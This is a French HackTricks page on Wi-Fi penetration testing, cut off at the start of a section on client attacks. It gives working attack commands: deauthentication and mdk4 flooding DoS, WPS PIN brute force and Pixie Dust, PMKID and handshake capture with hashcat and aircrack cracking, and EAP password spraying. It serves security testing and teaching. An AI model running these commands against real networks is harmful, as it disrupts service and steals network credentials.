# Test d'intrusion Wifi

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des pirates exp√©riment√©s et des chasseurs de primes !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs pirates d√®s aujourd'hui !

## Commandes de base Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Outils

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon est un outil tout-en-un pour les tests de s√©curit√© sans fil sur les r√©seaux Wi-Fi. Il combine de nombreuses attaques puissantes dans un seul outil, ce qui en fait un choix populaire parmi les testeurs de p√©n√©tration.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ex√©cutez airgeddon avec docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Il peut effectuer des attaques Evil Twin, KARMA et Known Beacons, puis utiliser un mod√®le de phishing pour parvenir √† obtenir le vrai mot de passe du r√©seau ou capturer les identifiants des r√©seaux sociaux.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Cet outil automatise les attaques **WPS/WEP/WPA-PSK**. Il effectuera automatiquement :

* Mettre l'interface en mode monitor
* Scanner les r√©seaux possibles - Et vous permet de s√©lectionner la victime
* Si WEP - Lancer des attaques WEP
* Si WPA-PSK
* Si WPS : Attaque Pixie dust et attaque par force brute (soyez prudent, l'attaque par force brute peut prendre beaucoup de temps). Notez qu'il n'essaie pas les PIN nuls ou les PIN g√©n√©r√©s par base de donn√©es.
* Essayer de capturer le PMKID de l'AP pour le craquer
* Essayer de d√©authentifier les clients de l'AP pour capturer un handshake
* Si PMKID ou Handshake, essayer de faire une attaque par force brute en utilisant les 5000 meilleurs mots de passe.

## R√©sum√© des attaques

* **DoS**
* Paquets de d√©authentification/d√©sassociation -- D√©connecter tout le monde (ou un ESSID/Client sp√©cifique)
* Faux AP al√©atoires -- Cacher les r√©seaux, possible de crasher les scanners
* Surcharge de l'AP -- Essayer de tuer l'AP (g√©n√©ralement pas tr√®s utile)
* WIDS -- Jouer avec l'IDS
* TKIP, EAPOL -- Quelques attaques sp√©cifiques pour DoS certains APs
* **Cracking**
* Cracker **WEP** (plusieurs outils et m√©thodes)
* **WPA-PSK**
* **PIN WPS** "Brute-Force"
* **WPA PMKID** brute force
* \[DoS +] Capture de **WPA handshake** + Cracking
* **WPA-MGT**
* Capture de **nom d'utilisateur**
* **Bruteforce** des identifiants
* **Jumeau mal√©fique** (avec ou sans DoS)
* Jumeau mal√©fique **ouvert** \[+ DoS] -- Utile pour capturer les identifiants du portail captif et/ou effectuer des attaques LAN
* Jumeau mal√©fique **WPA-PSK** -- Utile pour les attaques r√©seau si vous connaissez le mot de passe
* **WPA-MGT** -- Utile pour capturer les identifiants de l'entreprise
* **KARMA, MANA**, **Loud MANA**, **Balise connue**
* **+ Ouvert** -- Utile pour capturer les identifiants du portail captif et/ou effectuer des attaques LAN
* **+ WPA** -- Utile pour capturer les handshakes WPA

## DOS

### Paquets de D√©authentification

**Description de** [**ici**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Les attaques de **d√©authentification**, une m√©thode courante en piratage Wi-Fi, consistent √† forger des trames "de gestion" pour **d√©connecter de force les appareils d'un r√©seau**. Ces paquets non chiffr√©s trompent les clients en leur faisant croire qu'ils proviennent du r√©seau l√©gitime, permettant aux attaquants de collecter des handshakes WPA √† des fins de craquage ou de perturber de mani√®re persistante les connexions r√©seau. Cette tactique, alarmante par sa simplicit√©, est largement utilis√©e et a des implications significatives pour la s√©curit√© des r√©seaux.

**D√©authentification en utilisant Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 signifie d√©authentification
* 1 est le nombre de d√©authentifications √† envoyer (vous pouvez en envoyer plusieurs si vous le souhaitez); 0 signifie les envoyer en continu
* \-a 00:14:6C:7E:40:80 est l'adresse MAC du point d'acc√®s
* \-c 00:0F:B5:34:30:30 est l'adresse MAC du client √† d√©authentifier; si cela est omis, une d√©authentification de diffusion est envoy√©e (ne fonctionne pas toujours)
* ath0 est le nom de l'interface

### Paquets de d√©sassociation

Les **paquets de d√©sassociation**, similaires aux paquets de d√©authentification, sont un type de trame de gestion utilis√©e dans les r√©seaux Wi-Fi. Ces paquets servent √† rompre la connexion entre un appareil (tel qu'un ordinateur portable ou un smartphone) et un point d'acc√®s (AP). La principale distinction entre la d√©sassociation et la d√©authentification r√©side dans leurs sc√©narios d'utilisation. Alors qu'un AP √©met des **paquets de d√©authentification pour retirer explicitement les appareils ind√©sirables du r√©seau, les paquets de d√©sassociation sont g√©n√©ralement envoy√©s lorsque l'AP est en cours d'arr√™t, de red√©marrage ou de d√©placement, n√©cessitant ainsi la d√©connexion de tous les n≈ìuds connect√©s.

**Cette attaque peut √™tre effectu√©e par mdk4 (mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Plus d'attaques DOS par mdk4**

**Dans** [**ici**](https://en.kali.tools/?p=864)**.**

**MODE D'ATTAQUE b: Inondation de balises**

Envoie des trames de balises pour afficher de faux AP aux clients. Cela peut parfois faire planter les scanners r√©seau et m√™me les pilotes!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODE D'ATTAQUE a: D√©ni de service d'authentification**

L'envoi de trames d'authentification √† tous les Points d'Acc√®s (APs) accessibles dans la port√©e peut surcharger ces APs, surtout lorsque de nombreux clients sont impliqu√©s. Ce trafic intense peut entra√Æner une instabilit√© du syst√®me, provoquant le gel ou m√™me la r√©initialisation de certains APs.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODE D'ATTAQUE p: Exploration et Bruteforcing des SSID**

L'exploration des points d'acc√®s (AP) v√©rifie si un SSID est correctement r√©v√©l√© et confirme la port√©e de l'AP. Cette technique, associ√©e au **bruteforcing des SSID cach√©s** avec ou sans liste de mots, aide √† identifier et acc√©der aux r√©seaux dissimul√©s.

**MODE D'ATTAQUE m: Exploitation des Contremesures Michael**

L'envoi de paquets al√©atoires ou dupliqu√©s √† diff√©rentes files QoS peut d√©clencher les Contremesures Michael sur les AP **TKIP**, entra√Ænant un arr√™t d'un minute de l'AP. Cette m√©thode est une tactique d'attaque **DoS** (D√©ni de Service) efficace.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODE D'ATTAQUE e: Injection de paquets EAPOL Start et Logoff**

Inonder un point d'acc√®s avec des **trames de d√©marrage EAPOL** cr√©e des **sessions fictives**, submergeant le point d'acc√®s et bloquant les clients l√©gitimes. Alternativement, injecter des **faux messages de d√©connexion EAPOL** d√©connecte de force les clients, ces deux m√©thodes perturbent efficacement le service r√©seau.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODE D'ATTAQUE s : Attaques pour les r√©seaux maill√©s IEEE 802.11s**

Diverses attaques sur la gestion des liens et le routage dans les r√©seaux maill√©s.

**MODE D'ATTAQUE w : Confusion WIDS**

La connexion crois√©e des clients √† plusieurs n≈ìuds WDS ou √† de faux AP malveillants peut manipuler les syst√®mes de d√©tection et de pr√©vention des intrusions, cr√©ant de la confusion et un potentiel d'abus du syst√®me.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODE D'ATTAQUE f: Packet Fuzzer**

Un packet fuzzer proposant diverses sources de paquets et un ensemble complet de modificateurs pour la manipulation de paquets.

### **Airggedon**

_**Airgeddon**_ propose la plupart des attaques propos√©es dans les commentaires pr√©c√©dents :

![](<../../.gitbook/assets/image (92).png>)

## WPS

WPS (Wi-Fi Protected Setup) simplifie le processus de connexion des appareils √† un routeur, am√©liorant la vitesse et la facilit√© de configuration pour les r√©seaux crypt√©s avec **WPA** ou **WPA2** Personnel. Il est inefficace pour la s√©curit√© WEP facilement compromise. WPS utilise un PIN √† 8 chiffres, valid√© en deux moiti√©s, le rendant susceptible aux attaques par force brute en raison de son nombre limit√© de combinaisons (11 000 possibilit√©s).

### Brute Force WPS

Il existe 2 principaux outils pour effectuer cette action : Reaver et Bully.

* **Reaver** a √©t√© con√ßu pour √™tre une attaque robuste et pratique contre le WPS, et a √©t√© test√© contre une grande vari√©t√© de points d'acc√®s et d'impl√©mentations WPS.
* **Bully** est une **nouvelle impl√©mentation** de l'attaque par force brute WPS, √©crite en C. Il pr√©sente plusieurs avantages par rapport au code reaver original : moins de d√©pendances, am√©lioration des performances m√©moire et CPU, gestion correcte de l'endianness et un ensemble d'options plus robuste.

L'attaque exploite la **vuln√©rabilit√© du PIN WPS**, en particulier son exposition des quatre premiers chiffres et le r√¥le du dernier chiffre en tant que checksum, facilitant l'attaque par force brute. Cependant, les d√©fenses contre les attaques par force brute, comme **le blocage des adresses MAC** des attaquants agressifs, exigent une **rotation des adresses MAC** pour continuer l'attaque.

Apr√®s avoir obtenu le PIN WPS avec des outils comme Bully ou Reaver, l'attaquant peut d√©duire la PSK WPA/WPA2, assurant un **acc√®s r√©seau persistant**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Cette approche affin√©e cible les PIN WPS en utilisant des vuln√©rabilit√©s connues :

1. **PINs pr√©-d√©couverts** : Utilisez une base de donn√©es de PINs connus li√©s √† des fabricants sp√©cifiques connus pour utiliser des PINs WPS uniformes. Cette base de donn√©es corr√®le les trois premiers octets des adresses MAC avec des PINs probables pour ces fabricants.
2. **Algorithmes de g√©n√©ration de PIN** : Exploitez des algorithmes comme ComputePIN et EasyBox, qui calculent les PINs WPS en fonction de l'adresse MAC de l'AP. L'algorithme Arcadyan n√©cessite en outre un ID de p√©riph√©rique, ajoutant une couche au processus de g√©n√©ration de PIN.

### Attaque WPS Pixie Dust

**Dominique Bongard** a d√©couvert une faille dans certains Points d'Acc√®s (AP) concernant la cr√©ation de codes secrets, appel√©s **nonces** (**E-S1** et **E-S2**). Si ces nonces peuvent √™tre d√©couverts, craquer le PIN WPS de l'AP devient facile. L'AP r√©v√®le le PIN dans un code sp√©cial (hash) pour prouver qu'il est l√©gitime et non un AP faux (rogue). Ces nonces sont essentiellement les "cl√©s" pour d√©verrouiller le "coffre-fort" qui contient le PIN WPS. Plus d'informations √† ce sujet peuvent √™tre trouv√©es [ici](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

En termes simples, le probl√®me est que certains AP n'utilisaient pas des cl√©s assez al√©atoires pour chiffrer le PIN lors du processus de connexion. Cela rend le PIN vuln√©rable √† √™tre devin√© depuis l'ext√©rieur du r√©seau (attaque de force brute hors ligne).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Si vous ne voulez pas passer l'appareil en mode monitor, ou si `reaver` et `bully` posent probl√®me, vous pouvez essayer [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Cet outil peut effectuer une attaque Pixie Dust sans avoir √† passer en mode monitor.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Attaque de code PIN nul

Certains syst√®mes mal con√ßus permettent m√™me √† un **code PIN nul** (un code PIN vide ou inexistant) d'accorder l'acc√®s, ce qui est assez inhabituel. L'outil **Reaver** est capable de tester cette vuln√©rabilit√©, contrairement √† **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Toutes les attaques WPS propos√©es peuvent √™tre facilement effectu√©es en utilisant _**airgeddon.**_

![](<../../.gitbook/assets/image (216).png>)

* 5 et 6 vous permettent d'essayer **votre PIN personnalis√©** (si vous en avez un)
* 7 et 8 effectuent l'attaque **Pixie Dust**
* 13 vous permet de tester le **PIN NULL**
* 11 et 12 vont **r√©cup√©rer les PIN li√©s √† l'AP s√©lectionn√© √† partir des bases de donn√©es disponibles** et **g√©n√©rer** des **PIN** possibles en utilisant : ComputePIN, EasyBox et √©ventuellement Arcadyan (recommand√©, pourquoi pas ?)
* 9 et 10 testeront **chaque PIN possible**

## **WEP**

Tellement obsol√®te et inutilis√© de nos jours. Sachez simplement que _**airgeddon**_ a une option WEP appel√©e "All-in-One" pour attaquer ce type de protection. Plusieurs outils offrent des options similaires.

![](<../../.gitbook/assets/image (429).png>)

***

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de bugs !

**Perspectives de Hacking**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du hacking

**Actualit√©s de Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking en √©volution rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res Annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

***

## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** a [r√©v√©l√©](https://hashcat.net/forum/thread-7717.html) une nouvelle m√©thode d'attaque, unique car elle ne n√©cessite qu'**un seul paquet** et ne n√©cessite pas que des clients soient connect√©s √† l'AP cible, juste une interaction entre l'attaquant et l'AP.

De nombreux routeurs modernes ajoutent un **champ optionnel** au **premier trame EAPOL** lors de l'association, connu sous le nom de `Robust Security Network`. Cela inclut le `PMKID`.

Comme l'article original l'explique, le **PMKID** est cr√©√© en utilisant des donn√©es connues :
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
√âtant donn√© que le "Nom PMK" est constant, nous connaissons le BSSID de l'AP et de la station, et le `PMK` est identique √† celui d'une poign√©e de main compl√®te en 4 √©tapes, **hashcat** peut utiliser ces informations pour craquer le PSK et r√©cup√©rer la phrase secr√®te!

Pour **collecter** ces informations et **effectuer une attaque par force brute** localement sur le mot de passe, vous pouvez faire :
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Les **PMKIDs captur√©s** seront affich√©s dans la **console** et √©galement **enregistr√©s** dans \_ **/tmp/attack.pcap**\_\
Maintenant, convertissez la capture au format **hashcat/john** et cassez-le :
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Veuillez noter que le format correct d'un hachage contient **4 parties**, comme ceci : `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`. Si le v√¥tre ne contient **que 3 parties**, alors il est **invalide** (la capture PMKID n'√©tait pas valide).

Notez que `hcxdumptool` **capture √©galement les poign√©es de main** (quelque chose comme ceci appara√Ætra : **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Vous pouvez **transformer** les **poign√©es de main** au format **hashcat**/**john** en utilisant `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_J'ai remarqu√© que certaines poign√©es de main captur√©es avec cet outil ne pouvaient pas √™tre craqu√©es m√™me en connaissant le mot de passe correct. Je recommanderais de capturer les poign√©es de main √©galement de mani√®re traditionnelle si possible, ou d'en capturer plusieurs en utilisant cet outil._

### Capture de poign√©e de main

Une attaque sur les r√©seaux **WPA/WPA2** peut √™tre ex√©cut√©e en capturant une **poign√©e de main** et en tentant de **craquer** le mot de passe **hors ligne**. Ce processus implique de surveiller la communication d'un r√©seau sp√©cifique et du **BSSID** sur un **canal** particulier. Voici un guide simplifi√© :

1. Identifier le **BSSID**, le **canal** et un **client connect√©** du r√©seau cible.
2. Utiliser `airodump-ng` pour surveiller le trafic r√©seau sur le canal et le BSSID sp√©cifi√©s, en esp√©rant capturer une poign√©e de main. La commande ressemblera √† ceci :
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Pour augmenter les chances de capturer une poign√©e de main, d√©connectez momentan√©ment le client du r√©seau pour forcer une nouvelle authentification. Cela peut √™tre fait en utilisant la commande `aireplay-ng`, qui envoie des paquets de d√©authentification au client:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Notez que lorsque le client a √©t√© d√©sauthentifi√©, il pourrait essayer de se connecter √† un autre point d'acc√®s ou, dans d'autres cas, √† un r√©seau diff√©rent._

Une fois que les informations de poign√©e de main apparaissent dans `airodump-ng`, cela signifie que la poign√©e de main a √©t√© captur√©e et vous pouvez arr√™ter d'√©couter :

![](<../../.gitbook/assets/image (172) (1).png>)

Une fois la poign√©e de main captur√©e, vous pouvez la **cracker** avec `aircrack-ng` :
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### V√©rifier si le handshake est pr√©sent dans le fichier

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_If this tool finds an uncompleted handshake of an ESSID before the completed one, it won't detect the valid one._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Dans **les configurations WiFi d'entreprise, vous rencontrerez diverses m√©thodes d'authentification**, offrant chacune diff√©rents niveaux de s√©curit√© et fonctionnalit√©s de gestion. Lorsque vous utilisez des outils tels que `airodump-ng` pour inspecter le trafic r√©seau, vous pouvez remarquer des identifiants pour ces types d'authentification. Certaines m√©thodes courantes incluent :
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Cette m√©thode prend en charge les jetons mat√©riels et les mots de passe √† usage unique dans EAP-PEAP. Contrairement √† MSCHAPv2, elle n'utilise pas de d√©fi pair et envoie les mots de passe en texte clair √† l'acc√®s point, posant un risque d'attaques de r√©trogradation.
2. **EAP-MD5 (Message Digest 5)**:
* Implique l'envoi du hachage MD5 du mot de passe du client. Il **n'est pas recommand√©** en raison de la vuln√©rabilit√© aux attaques par dictionnaire, du manque d'authentification du serveur et de l'incapacit√© √† g√©n√©rer des cl√©s WEP sp√©cifiques √† la session.
3. **EAP-TLS (Transport Layer Security)**:
* Utilise √† la fois des certificats c√¥t√© client et c√¥t√© serveur pour l'authentification et peut g√©n√©rer dynamiquement des cl√©s WEP bas√©es sur l'utilisateur et la session pour s√©curiser les communications.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
* Fournit une authentification mutuelle via un tunnel chiffr√©, ainsi qu'une m√©thode pour d√©river des cl√©s WEP dynamiques, par utilisateur et par session. Il ne n√©cessite que des certificats c√¥t√© serveur, les clients utilisant des identifiants.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* Fonctionne de mani√®re similaire √† EAP en cr√©ant un tunnel TLS pour une communication prot√©g√©e. Il permet l'utilisation de protocoles d'authentification plus faibles sur EAP en raison de la protection offerte par le tunnel.
* **PEAP-MSCHAPv2**: Souvent appel√© PEAP, il combine le m√©canisme de d√©fi/r√©ponse MSCHAPv2 vuln√©rable avec un tunnel TLS protecteur.
* **PEAP-EAP-TLS (ou PEAP-TLS)**: Similaire √† EAP-TLS mais initie un tunnel TLS avant d'√©changer des certificats, offrant une couche de s√©curit√© suppl√©mentaire.

Vous pouvez trouver plus d'informations sur ces m√©thodes d'authentification [ici](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) et [ici](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Capture de nom d'utilisateur

En lisant [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), il semble que si vous utilisez **EAP**, les **messages "Identit√©"** doivent √™tre **pris en charge**, et le **nom d'utilisateur** sera envoy√© en **clair** dans les **messages "R√©ponse Identit√©"**.

M√™me en utilisant l'une des m√©thodes d'authentification les plus s√©curis√©es : **PEAP-EAP-TLS**, il est possible de **capturer le nom d'utilisateur envoy√© dans le protocole EAP**. Pour ce faire, **capturez une communication d'authentification** (d√©marrez `airodump-ng` sur un canal et `wireshark` sur la m√™me interface) et filtrez les paquets par `eapol`.\
Dans le paquet "**R√©ponse, Identit√©**", le **nom d'utilisateur** du client appara√Ætra.

![](<../../.gitbook/assets/image (847).png>)

### Identit√©s anonymes

La dissimulation de l'identit√© est prise en charge √† la fois par EAP-PEAP et EAP-TTLS. Dans le contexte d'un r√©seau WiFi, une demande d'identit√© EAP est g√©n√©ralement initi√©e par le point d'acc√®s (AP) lors du processus d'association. Pour garantir la protection de l'anonymat de l'utilisateur, la r√©ponse du client EAP sur l'appareil de l'utilisateur ne contient que les informations essentielles requises pour que le serveur RADIUS initial traite la demande. Ce concept est illustr√© √† travers les sc√©narios suivants :

* EAP-Identit√© = anonyme
* Dans ce sc√©nario, tous les utilisateurs utilisent le pseudonyme "anonyme" comme identifiant utilisateur. Le serveur RADIUS initial fonctionne soit comme un serveur EAP-PEAP ou EAP-TTLS, responsable de la gestion du c√¥t√© serveur du protocole PEAP ou TTLS. La m√©thode d'authentification interne (prot√©g√©e) est ensuite soit g√©r√©e localement, soit d√©l√©gu√©e √† un serveur RADIUS distant (domicile).
* EAP-Identit√© = anonyme@realm\_x
* Dans cette situation, les utilisateurs de diff√©rents domaines dissimulent leurs identit√©s tout en indiquant leurs domaines respectifs. Cela permet au serveur RADIUS initial de transmettre les demandes EAP-PEAP ou EAP-TTLS aux serveurs RADIUS dans leurs domaines d'origine, qui agissent en tant que serveur PEAP ou TTLS. Le serveur RADIUS initial fonctionne uniquement comme un n≈ìud relais RADIUS.
* Alternativement, le serveur RADIUS initial peut fonctionner comme le serveur EAP-PEAP ou EAP-TTLS et g√©rer la m√©thode d'authentification prot√©g√©e ou la transf√©rer √† un autre serveur. Cette option facilite la configuration de politiques distinctes pour diff√©rents domaines.

Dans EAP-PEAP, une fois que le tunnel TLS est √©tabli entre le serveur PEAP et le client PEAP, le serveur PEAP initie une demande d'identit√© EAP et la transmet √† travers le tunnel TLS. Le client r√©pond √† cette deuxi√®me demande d'identit√© EAP en envoyant une r√©ponse d'identit√© EAP contenant la v√©ritable identit√© de l'utilisateur √† travers le tunnel chiffr√©. Cette approche emp√™che efficacement la divulgation de l'identit√© r√©elle de l'utilisateur √† toute personne qui √©coute le trafic 802.11.

EAP-TTLS suit une proc√©dure l√©g√®rement diff√©rente. Avec EAP-TTLS, le client s'authentifie g√©n√©ralement en utilisant PAP ou CHAP, s√©curis√© par le tunnel TLS. Dans ce cas, le client inclut un attribut Nom d'utilisateur et soit un attribut Mot de passe, soit un attribut CHAP-Mot de passe dans le message TLS initial envoy√© apr√®s l'√©tablissement du tunnel.

Peu importe le protocole choisi, le serveur PEAP/TTLS obtient connaissance de la v√©ritable identit√© de l'utilisateur une fois que le tunnel TLS a √©t√© √©tabli. La v√©ritable identit√© peut √™tre repr√©sent√©e sous la forme utilisateur@domaine ou simplement utilisateur. Si le serveur PEAP/TTLS est √©galement responsable de l'authentification de l'utilisateur, il poss√®de d√©sormais l'identit√© de l'utilisateur et proc√®de √† la m√©thode d'authentification prot√©g√©e par le tunnel TLS. Alternativement, le serveur PEAP/TTLS peut transmettre une nouvelle demande RADIUS au serveur RADIUS domestique de l'utilisateur. Cette nouvelle demande RADIUS exclut la couche de protocole PEAP ou TTLS. Dans les cas o√π la m√©thode d'authentification prot√©g√©e est EAP, les messages EAP internes sont transmis au serveur RADIUS domestique sans l'enveloppe EAP-PEAP ou EAP-TTLS. L'attribut Nom d'utilisateur du message RADIUS sortant contient la v√©ritable identit√© de l'utilisateur, rempla√ßant le Nom d'utilisateur anonyme du message RADIUS entrant. Lorsque la m√©thode d'authentification prot√©g√©e est PAP ou CHAP (prise en charge uniquement par TTLS), l'attribut Nom d'utilisateur et les autres attributs d'authentification extraits de la charge utile TLS sont substitu√©s dans le message RADIUS sortant, rempla√ßant le Nom d'utilisateur anonyme et les attributs EAP-Message TTLS trouv√©s dans la demande RADIUS entrante.

Pour plus d'informations, consultez [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

Si le client est cens√© utiliser un **nom d'utilisateur et un mot de passe** (notez que **EAP-TLS ne sera pas valide** dans ce cas), vous pourriez essayer d'obtenir une **liste** de **noms d'utilisateur** (voir la prochaine partie) et de **mots de passe** et essayer de **forcer l'acc√®s** en utilisant [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Vous pourriez √©galement effectuer cette attaque en utilisant `eaphammer` :
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Th√©orie des attaques client

### S√©lection du r√©seau et itin√©rance

